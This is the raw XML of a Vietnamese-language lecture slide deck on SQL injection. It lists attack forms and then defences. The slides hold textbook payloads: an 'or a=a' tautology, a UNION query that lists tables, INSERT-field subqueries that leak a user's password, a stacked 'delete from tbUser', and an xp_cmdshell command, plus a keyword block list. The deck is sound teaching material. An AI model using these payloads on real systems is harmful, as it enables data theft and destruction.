                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>=‘ or ‘a’=‘a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đương nhiên câu lệnh truy vấn sẽ trở thành:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Select * from tbKhachHang where QuyenSuDung=‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>’ or ‘a’=‘a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đồng nghĩa với tất cả dữ liệu sẽ được hiển thị.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3673965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57739" y="482710"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2057400"/>
            <a:ext cx="9621077" cy="3710607"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công thông qua việc thay đổi điều kiện của câu lệnh select</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Trong ví dụ trên, để hiển thị danh sách các bảng trong CSDL ta chỉ cần thêm vào câu lệnh select đoạn mã:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>UNION SELECT *TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ta sẽ có được các bảng của CSDL này.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31802075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04731" y="389945"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1404731" y="2252869"/>
            <a:ext cx="9276521" cy="2968487"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công thông qua câu lệnh insert</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thông thường, một trang web luôn có chức năng đăng kí tài khoản (nghĩa là một lệnh insert sẽ được thực thi). Sau khi đăng kí xong, người sử dụng có thể xem lại các thông tin đã đăng kí trước đó.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Lợi dụng việc này, kẻ tấn công sẽ nhập một đầu vào hợp lệ để thực hiện mục đích nào đó.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4076258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57740" y="442954"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1008288" y="1649341"/>
            <a:ext cx="8785070" cy="4249368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công thông qua câu lệnh insert</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ: Câu lệnh SQL để đăng kí tài khoản của một trang web như sau:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>“Insert into tbUser values (‘”+taiKhoan+”’, ‘”+matKhau+”’,’”+queQuan+”’,’”+noiLamViec+”’)”;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Với taiKhoan,matKhau,queQuan,noiLamViec là các biến đầu vào</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Tuy nhiên, phần queQuan và noiLamViec, kẻ tấn công sẽ nhập như sau:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>‘ + (select top 1 TaiKhoan from tbUser) + ‘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>‘ + (select top 1 MatKhau from tbUser) + ‘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thì đương nhiên, kẻ tấn công sẽ lấy được tài khoản, mật khẩu của người dùng thứ 1 trong hệ thống vì khi đăng kí, họ có thể xem lại các thông tin queQuan và noiLamViec</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19064939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44487" y="442954"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1159099" y="2133600"/>
            <a:ext cx="10345513" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công thông qua câu lệnh insert</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ: Cũng xét câu lệnh Sql trên:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>“Insert into tbUser values (‘”+taiKhoan+”’, ‘”+matKhau+”’,’”+queQuan+”’,’”+noiLamViec+”’)”;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kẻ tấn công còn có thể thực hiện thêm các câu lệnh sql nhằm mục đích nào đó.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ: phần noiLamViec, kẻ tấn công nhập như sau:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>;);delete * from tbUser where (‘a’=‘a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Theo đó, kẻ tấn công sẽ xóa toàn bộ các bản ghi trong tbUser, gây ảnh hưởng lớn tới hệ thống thông tin</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21480223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17983" y="509215"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1159099" y="2133600"/>
            <a:ext cx="10345513" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công sử dụng stored-procedures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Việc tấn công bằng stored-procedures sẽ gây tác hại rất lớn tới ứng dụng được thực thi với quyền cao nhất “sa”.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ, nếu ta thêm một đoạn mã có dạng:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>‘;exec xp_cmdshell ‘cmd.exe dir C:’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Lúc này, hệ thống sẽ liệt kê tất cả thư mục ổ đĩa C:\ trên server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Việc phá hoại này tùy thuộc vào lệnh đằng sau cmd.exe</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1288930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83706" y="457200"/>
            <a:ext cx="10649334" cy="1218795"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1511138" y="1981200"/>
            <a:ext cx="9392477" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm soát chặt chẽ việc kiểm tra dữ liệu khi lập trình</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Việc này khá đơn giản nhưng thường bị bỏ qua.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sau đây là phương pháp kiểm tra dữ liệu đầu vào tránh khai thác sql injection:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Không cho nhập kí tự ‘.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Không cho nhập các từ khóa như insert, drop, select, -- , …</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm soát chặt chẽ các “querystring”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22029683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47800" y="381000"/>
            <a:ext cx="10384292" cy="1218795"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1447801" y="1599795"/>
            <a:ext cx="9888384" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Không thông báo lỗi bằng Exception trong các framework khi lập trình</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các lỗi thông báo thông qua Exception của các framework thường tiết lộ các chi tiết kĩ thuật cho phép kẻ tấn công biết được điểm yếu của hệ thống</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F4947D6-86E5-44E0-9836-E2EF4BACCD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7835" y="3488606"/>
            <a:ext cx="11042545" cy="2443163"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27201703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91379" y="457200"/>
            <a:ext cx="10433987" cy="1218795"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066801" y="2133600"/>
            <a:ext cx="10437812" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
